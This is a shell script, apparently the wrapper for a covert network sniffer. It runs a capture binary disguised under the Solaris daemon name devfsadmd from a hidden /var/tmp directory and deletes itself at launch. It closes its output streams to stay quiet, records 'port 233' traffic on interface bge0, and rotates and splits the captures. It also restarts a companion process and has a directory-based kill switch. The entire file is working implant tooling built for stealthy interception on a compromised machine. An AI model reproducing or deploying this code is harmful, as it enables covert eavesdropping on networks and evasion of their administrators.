#!/bin/sh
#DIR=/lib/.08f6fc263f8b8449
DIR=/var/tmp/.42d0a64ce836d9db
BDIR=/tmp
DEST1=$DIR/s
DEST2=$DEST1/s
DBGDIR=$DIR/d
SELFDELETE=1
COMPRESS=
TOOL=devfsadmd
MAXPCT=75
WIPEONMAX=0
WIPEUNDER=0
RETRYONDIE=0
MAXFILES=600
OUTFILE=s
CONF=$DEST1/${OUTFILE}.c
DIEDIR=$DEST1/D.${OUTFILE}
V=""
SPLIT=0
# Sift args
CAP=10
FILT="port 233"
INTF=bge0
PSCMD=
SCRIPTNAME=
RUNFOR=7200
DELAYFOR=0
SLEEPFOR=1670
WATCHFOR=
WATCHFORCHILDREN=
INODEDF=""
KBDF=""
MOREARGS=""
# END ARGS   :::  DO  NOT  DELETE  THIS  LINE
# Args above here can be changed by autowrapsift, nothing below can.
VER=1.3.0.6
STDERR=yes
ERR=0

dbg() {
  [ "$STDERR" ] && echo -e "($INTF:$FILTDBG)[$$] $*" 1>&2
  [ -d $DBGDIR ] && echo -e `date -u`: "($INTF:$FILTDBG)[$$] $*" >> $DBGDIR/.dbg
  [ ! -d $DBGDIR ] && [ $ERR -gt 0 ] && echo -e `date -u`: "($INTF:$FILTDBG)[$$] ERR=$ERR" >> $DEST1/.D$OUTFILE
}

die() {
  ERR=$1
  shift
  MSG="$*"
  [ "$MSG" ] || MSG=$ERR
  dbg "FATAL: $MSG"
  exit $ERR
}

info() {
#    dbg Using at most $MAXPCT% of ${KBTOT}K available or ${OURMAX}K
    dbg Using at most $MAXPCT% of bytes/inodes
    [ $WIPEONMAX -gt 0 ] && dbg "Wiping our oldest files when $MAXPCT% is exceeded"
    [ $WIPEUNDER -gt 0 ] && dbg "Wiping any files under $WIPEUNDER bytes before compression"
    [ $RETRYONDIE -gt 0 ] && dbg "Sleeping $SLEEPFOR on sift failure later, usu. when interface down"
    dbg "Using at most $MAXPCT% of inodes available, ${IPCT}% is currently used"
    dbg "Variables so far: MAXPCT=$MAXPCT IPCT=$IPCT EXT=$EXT KBTOT=$KBTOT= OURMAX=$OURMAX= KBUSED=$KBUSED= DELAYFOR=$DELAYFOR="
    dbg "$0 PID is $$, kill me with \n\nkill -9 $$\n\nOR WITH\n\nmkdir $DIEDIR\n\n"
}

watchfor() {
    # Disabled if $WATCHFOR is missing or non-executable
    if [ "$WATCHFOR" -a -x "$DIR/$WATCHFOR" ] ; then
	FAILCOUNT=0
	MOVEON=""
	while [ 1 ] ; do
	    [ $FAILCOUNT -gt 20 ] && die 36 Too many failed attempts to start $WATCHFOR
	    [ $FAILCOUNT -gt 0 ] && sleep 1
	    MAINPID=`ps -ef | grep -v grep | grep " \./$WATCHFOR" | tee -a $DBGDIR/.dbg | awk '{print $2}' | tr '\n\r' '  ' | sed "s, $,,g"`
	    dbg "Looking for WATCHFOR=$WATCHFOR= found MAINPID=$MAINPID= FAILCOUNT=$FAILCOUNT="
	    [ "$STDERR" ] && ps -ef  | grep -v grep | grep " \./$WATCHFOR"
	    # Hard code to "ps -ef" for now. PSCMD is defined, but what columns have pid varies.
	    if [ "$MAINPID" ] ; then
	        for THISPID in "$MAINPID" ; do
		    if [ "$WATCHFORCHILDREN" ] ; then
		        FOUND=""
		        for K in $WATCHFORCHILDREN ; do
			    dbg "Found THISPID=$THISPID looking for pid of $K as \" $THISPID .*$K\""
			    KIDPID=`ps -ef | grep -v grep | egrep " $THISPID .*$K"`
			    [ "$KIDPID" ] && dbg "Found child of $THISPID running $K, KIDPID\n==\n$KIDPID\n=="
			    [ "$KIDPID" ] && FOUND=yes
		        done
		        if [ ! "$FOUND" ] ; then
			    FAILCOUNT=`echo $FAILCOUNT+1 | bc`
			    if [ $FAILCOUNT -gt 9 ] ; then
			        dbg "Found WATCHFOR=$WATCHFOR as PID=$THISPID but no CHILDREN=$WATCHFORCHILDREN= for ten seconds. Must KILL $THISPID"
			        kill -9 $THISPID
			        THISPID=`ps -ef | grep -v grep | grep " $THISPID " | awk '{print $2}' | head -1`
			        [ "$THISPID" ] && MOVEON=yes && dbg Could not kill -9 $THISPID. Must move on.
			        [ "$THISPID" ] || continue
				break
			    else
			        dbg "Found WATCHFOR=$WATCHFOR as PID=$THISPID but no CHILDREN=$WATCHFORCHILDREN=. Giving it ten seconds."
			        continue
			    fi
		        fi
		    else
			FOUND=yes
		    fi
		    [ "$FOUND" ] && break
	        done
		[ "$MOVEON$FOUND" ] && break
	    else
		FAILCOUNT=`echo $FAILCOUNT+1 | bc`
		dbg No WATCHFOR=$WATCHFOR running, starting with ./$WATCHFOR
		(cd $DIR ; ./$WATCHFOR   >/dev/null 2>/dev/null & )  >/dev/null 2>/dev/null &
	    fi
	done
    fi
}

PATH=$BDIR:$DIR:/bin:/usr/bin:/sbin:/usr/sbin:/usr/ucb
export PATH

dbg DEBUG output will be sent to $DBGDIR/.dbg if that location exists.

trap : TERM

FILTDBG=$FILT
LEN=`echo "$FILT" | wc -c`

if [ $LEN -gt 40 ] ; then
    FILTDBG="$LEN char filter"
fi
unset LEN

export PATH DEST1 DEST2 DIR TOOL FILT FILTDBG

if [ "$COMPRESS" ] ; then
    dbg "Testing $COMPRESS on copy of $0"
    while [ 1 ] ; do 
        EXT=`date -u +%Y%m%d%H%M%S`
        EXT=""
        [ -f "$0.$EXT" ] && sleep 1 && continue
        cp $0 $0.$EXT || die 26 Cannot copy $0 to $0.$EXT
        break
    done
    $COMPRESS $0.$EXT
    ERR=$?
    dbg "$COMPRESS returned $ERR"
    ls -alrt $0*
    rm $rmverbose -f $0.$EXT* || die 27 Cannot delete $0.$EXT*
    if [ $ERR -ne 0 ] ; then
        rm $rmverbose -f $0 || die 28 Cannot delete $0 after $COMPRESS failed
        die 25 $COMPRESS failed test on $0.$EXT
    fi
fi

if [ $SELFDELETE -gt 0 ] ; then
    dbg "Removing self ($0)"
    rm $rmverbose -f $0 || die 19 Cannot delete $0
fi

if [ "$WATCHFOR" ] ; then
    dbg WATCHING for $DIR/$WATCHFOR: 
    ls -al $DIR/$WATCHFOR || dbg "WATCHFOR=$WATCHFOR= does not exist in $DIR/, will start it if it appears there"
fi

[ -d "$BDIR" ] || die 12 BDIR=$BDIR must exist
[ -d "$DIR" ] || die 12 DIR=$DIR must exist
[ -d "$DEST2" ] || mkdir -p $DEST2
TEST=`which $TOOL 2>&1| grep "$DIR/$TOOL"` 
[ "$TEST" ] && dbg "continuing, $TOOL is in PATH=$PATH"
[ ! "$TEST" ] && die 11 "cannot continue $TOOL either not in PATH or not in $DIR (which $TOOL=`which $TOOL 2>&1`)"

TEST=`$PSCMD 2>&1| egrep -v "grep| $$ " | grep "sh .*$SCRIPTNAME"`
if [ "$TEST" ] ; then
    die 30 "Cannot run $0, it is already running: $TEST"
else
    dbg "Continuing, no previous instance of sh .*$SCRIPTNAME"
fi
if [ $SPLIT -gt 0 ] ; then
    man split | grep -- -b || die 32 split binary man page not on target
    which split || die 33 split binary not in PATH=$PATH
fi

cd /

WHICH=FIRST
TESTRUN=""
ERRCOUNT=0
MINCOUNT=0
LASTMIN=""

while [ 1 ] ; do 
    [ -d "$DEST2" ] || die 13 DEST2=$DEST2= not a dir
    [ -x "$DIR/$TOOL" ] || die 14 $DIR/$TOOL not executable
    [ -d $DIEDIR ] && break

    THISMIN=`date -u +%Y%m%d%H%M`
    if [ "$THISMIN" = "$LASTMIN" ] ; then
        MINCOUNT=`echo $MINCOUNT+1 | bc`
    else
        MINCOUNT=0
        LASTMIN=$THISMIN
    fi
    if [ $MINCOUNT -gt 5 ] ; then
        if [ $RETRYONDIE -gt 0 ] ; then
            dbg "Looped over 5 times per minute, sleeping $SLEEPFOR then trying again"
            unset STDERR
            exec >&- 2>&- 3>&- 4>&- 5>&- 6>&- 7>&- 8>&- 9>&-
            sleep $SLEEPFOR
            MINCOUNT=0
            continue
        else
            die 24 over five loops per minute
        fi
    fi
    dbg LASTMIN=$LASTMIN MINCOUNT=$MINCOUNT

    watchfor $WATCHFOR

    if [ -f $CONF ] ; then
        if [ -s $CONF ] ; then
            MORE=""
            if [ $ERR -gt 0 ] ; then
                # If ERR last time through AND a config file, we assume here
                # someone killed the sift binary to read in the new config
                ERRCOUNT=`echo $ERRCOUNT-1 | bc`
                MORE="... decremented ERRCOUNT to $ERRCOUNT"
            fi
            dbg sourcing/deleting $CONF containing${MORE}: `cat $CONF`
            . $CONF
            TESTRUN=""
        fi
        rm $rmverbose -f $CONF
        info
        unset MORE
    fi


    KBUSED=`$KBDF $DEST1 | grep "%" | grep "/" | sed "s,.* \(.*\)%.*,\1," | tr -dc '0123456789'`
    if [ "$INODEDF" ] ; then
#        IPCT=`$INODEDF $DEST1 | grep "[0-9]%" | awk '{print $4}' | tr -dc '0123456789'`
        IPCT=`$INODEDF $DEST1 | grep "[0-9]%" | sed "s,.* \(.*\)%.*,\1," | tr -dc '0123456789'`
        [ "$IPCT" ] || die 18 IPCT=$IPCT= not defined
    fi

    [ "$KBUSED" ] || die 16 KBUSED=$KBUSED= not defined
#    [ "$OURMAX" ] || die 17 OURMAX=$OURMAX= not defined

    [ "$STDERR" ] && info


    if [ ! "$TESTRUN" ] ; then
        if [ -f $DEST1/.$OUTFILE ] ; then 
            if [ $SELFDELETE -eq 0 ] ; then
                EXT=atstart.`date -u +%Y%m%d%H%M%S`
                if [ -f $DEST1/.$OUTFILE ] ; then
                    DESTFILE=$DEST2/${OUTFILE}.$EXT
                    if [ "$COMPRESS" ] ; then
                        dbg compressing with $COMPRESS ${OUTFILE}.$EXT
                        $COMPRESS $DEST1/.${OUTFILE}
                        DESTFILE=$DEST2/${OUTFILE}.$EXT.bz2
                        [ "$COMPRESS" = "compress" ] && DESTFILE=${OUTFILE}.$EXT.Z
                        [ "$COMPRESS" = "gzip" ] && DESTFILE=${OUTFILE}.$EXT.gz
                    fi
                    dbg On start, last output file moved:  mv $V $DEST1/.$OUTFILE* $DESTFILE
                    mv $v $DEST1/.$OUTFILE* $DESTFILE
                fi
            else
                die 29 Output file $DEST1/.$OUTFILE exists already, move to $DEST2 or delete it.
            fi
        fi
        dbg "TWO SECOND TEST RUN: C=\"-f -i \$INTF -p\\\"2:$FILT\\\" -s $CAP -n $DEST1/.$OUTFILE$MOREARGS\" $TOOL"
        C="-f -i $INTF -p\"2:$FILT\" -s $CAP -n $DEST1/.$OUTFILE$MOREARGS" $TOOL
        TESTRUN=$?
        dbg "TEST RUN returned $TESTRUN : `ls -al $DEST1/`"
        if [ $TESTRUN -gt 0 ] ; then
            TESTRUN2=`echo $TESTRUN+90 | bc`
            die $TESTRUN2 "Test 2 second run returned $TESTRUN, cannot continue"
        fi
        # Just remove two second capture
        rm $rmverbose -f $DEST1/.$OUTFILE   
    fi


#    if [ $KBUSED -gt $OURMAX ] ; then
    if [ $KBUSED -gt $MAXPCT ] ; then
        if [ $WIPEONMAX -lt 1 ] ; then
            dbg "Cannot write, KBUSED > MAXPCT (${KBUSED}% is over ${MAXPCT}% full), sleeping $SLEEPFOR (but still running)"
            unset STDERR
            exec >&- 2>&- 3>&- 4>&- 5>&- 6>&- 7>&- 8>&- 9>&-
            sleep $SLEEPFOR
            ERR=$?
            if [ $ERR -gt 0 ] ; then
                ERRCOUNT=`echo $ERRCOUNT+1 | bc`
                if [ $ERRCOUNT -gt 15 ] ; then
                    die 22 "ERROR COUNT $ERRCOUNT: cannot continue"
                fi
            fi
        else
            WIPECT=`ls -Art1 $DEST2/${OUTFILE}* 2>/dev/null | wc -l`
            if [ $WIPECT -lt 1 ] ; then
                dbg "Cannot wipe (no files) so cannot write KBUSED > MAXPCT (${KBUSED}% is over ${MAXPCT}% full), sleeping $SLEEPFOR (but still running)"
                unset STDERR
                exec >&- 2>&- 3>&- 4>&- 5>&- 6>&- 7>&- 8>&- 9>&-
                sleep $SLEEPFOR
                ERR=$?
            else
                while [ $KBUSED -gt $MAXPCT -a $WIPECT -gt 0 ] ; do
                    /bin/rm $V -f `ls -Art1 $DEST2/${OUTFILE}* 2>/dev/null | head  -1`
                    ERR=$?
                    [ "$ERR" -ne 0 ] && break
                    KBUSED=`$KBDF $DEST1 | grep "%" | grep "/" | sed "s,.* \(.*\)%.*,\1," | tr -dc '0123456789'`
                    WIPECT=`ls -Art1 $DEST2/${OUTFILE}* 2>/dev/null | wc -l`
                done
                [ $ERR -eq 0 -a $WIPECT -gt 0 ] && /bin/rm $V -f `ls -Art1 $DEST2/${OUTFILE}* | head  -1`
                ERR=$?
            fi
            if [ $ERR -gt 0 ] ; then
                ERRCOUNT=`echo $ERRCOUNT+1 | bc`
                if [ $ERRCOUNT -gt 15 ] ; then
                    die 22 "ERROR COUNT $ERRCOUNT: cannot continue"
                fi
            fi
        fi
        if [ $KBUSED -gt $MAXPCT ] ; then
            if [ $SELFDELETE -eq 0 ] ; then
                dbg "Unable to resolve space issue, persisting though, just looping"
                continue
            fi
            die 31 "Unable to resolve space issue, must die: KBUSED=$KBUSED > MAXPCT=$MAXPCT but WIPECT=$WIPECT "
        else
            continue
        fi

    fi
    if [ $IPCT -gt $MAXPCT ] ; then
        dbg "Cannot write, inodes %used $IPCT > $MAXPCT, sleeping $SLEEPFOR (but still running)"
        unset STDERR
        exec >&- 2>&- 3>&- 4>&- 5>&- 6>&- 7>&- 8>&- 9>&-
        sleep $SLEEPFOR
        ERR=$?
        if [ $ERR -gt 0 ] ; then
            ERRCOUNT=`echo $ERRCOUNT+1 | bc`
            if [ $ERRCOUNT -gt 15 ] ; then
                die 23 "ERROR COUNT $ERRCOUNT: cannot continue"
            fi
        fi
        continue
    fi
    #TODO: Look closer here...is this 2sec run being done every time thru?
    EXT=`date -u +%Y%m%d%H%M%S`
    if [ ! -f $DEST1/.$OUTFILE ] ; then 
        # A 2 second run before we close stdout to test syntax
        dbg "RUNNING $WHICH ONE AS: C=\"-f -i $INTF -p\\\"$RUNFOR:$FILT\\\" -s $CAP -n $DEST1/.$OUTFILE$MOREARGS\" $TOOL"
        WHICH=THIS
        unset STDERR
        exec >&- 2>&- 3>&- 4>&- 5>&- 6>&- 7>&- 8>&- 9>&-
        C="-f -i $INTF -p\"$RUNFOR:$FILT\" -s $CAP -n $DEST1/.$OUTFILE$MOREARGS" $TOOL
        ERR=$?
    else
	GOODCAP=yes
        dbg  $TOOL exited with $ERR
	if [ $WIPEUNDER -gt 0 ] ; then
	    if [ `cat $DEST1/.${OUTFILE} | wc -c` -lt $WIPEUNDER ] ; then
		[ -d $DBGDIR ] && dbg REMOVING $DEST1/.${OUTFILE} size must be under $WIPEUNDER  `ls -al $DEST1/.$OUTFILE`
		rm $rmverbose -f $DEST1/.${OUTFILE}
		GOODCAP=""
	    fi
	fi
	if [ "$GOODCAP" = "yes" ] ; then
            dbg Now compress/split/moving last one from $DEST1 to $DEST2 with EXT=$EXT SPLIT=$SPLIT BACKGROUNDED BLOCK
            (
                cd $DEST1
	        [ -d $DBGDIR -a $WIPEUNDER -gt 0 ] && dbg size of $DEST1/.${OUTFILE} must be ge $WIPEUNDER  `ls -al $DEST1/.$OUTFILE`
                mv $V .${OUTFILE} ${OUTFILE}.$EXT
                SPLITFILE=${OUTFILE}.$EXT
                if [ "$COMPRESS" ] ; then
                    dbg compressing with $COMPRESS ${OUTFILE}.$EXT
                    $COMPRESS ${OUTFILE}.$EXT
                    SPLITFILE=${OUTFILE}.$EXT.bz2
                    [ "$COMPRESS" = "compress" ] && SPLITFILE=${OUTFILE}.$EXT.Z
                    [ "$COMPRESS" = "gzip" ] && SPLITFILE=${OUTFILE}.$EXT.gz
                fi
                if [ $SPLIT -gt 0 ] ; then
                    dbg splitting $SPLITFILE into $SPLIT byte chunks reassemble with cat ${SPLITFILE}_'*'
                    split -b $SPLIT -a 3 $SPLITFILE ${SPLITFILE}_
                    if [ $? == 0 ] ; then
                        rm $SPLITFILE
                    else
                        die 34 split failed: split -b $SPLIT -a 3 $SPLITFILE ${SPLITFILE}_
                    fi
                fi
                dbg moving ready files with: mv $V $SPLITFILE* $DEST2/
                if [ -d $DBGDIR ] ; then
                        mv $V $SPLITFILE* $DEST2/ >> $DBGDIR/.dbg 2>&1
                else
                        mv $V $SPLITFILE* $DEST2/
                fi
            ) &
	fi
    fi
    if [ $DELAYFOR -gt 0 ] ; then
        dbg sleeping $DELAYFOR until next run
        sleep $DELAYFOR
    fi

    # Check DEST1 for stranded files, note them--ignore dotted files, so no -a or -A
    COU=`cd $DEST1 ; ls -t1 2>/dev/null | wc -l`
    COU=`echo $COU-$MAXFILES | bc`
    if [ $COU -gt 0 ] ; then
        for f in `cd $DEST2 ; ls -At1 2>/dev/null | tail -$COU` ; do
            dbg "Stranded $COU files in $DEST1, not removing them, why is this happening"
	    dbg `cd $DEST1 ; ls -arlt`
        done
    fi

    # Remove if too many files, more than $MAXFILES-1 files
    COU=`cd $DEST2 ; ls -At1 2>/dev/null | wc -l`
    COU=`echo $COU-$MAXFILES | bc`
    if [ $COU -gt 0 ] ; then
        for f in `cd $DEST2 ; ls -At1 2>/dev/null | tail -$COU` ; do
            dbg "Removing $COU excess files (leaving $MAXFILES): $f"
            rm $rmverbose -f $DEST2/$f
        done
    fi

    if [ $ERR -gt 0 ] ; then
        ERRCOUNT=`echo $ERRCOUNT+1 | bc`
        if [ $ERRCOUNT -gt 15 ] ; then
            die 21 "ERROR COUNT $ERRCOUNT: cannot continue"
        fi
    fi
done
dbg "ERR=$ERR ERRCOUNT=$ERRCOUNT DONE: "`ls -ald $DIEDIR 2>/dev/null`

rmdir $DIEDIR
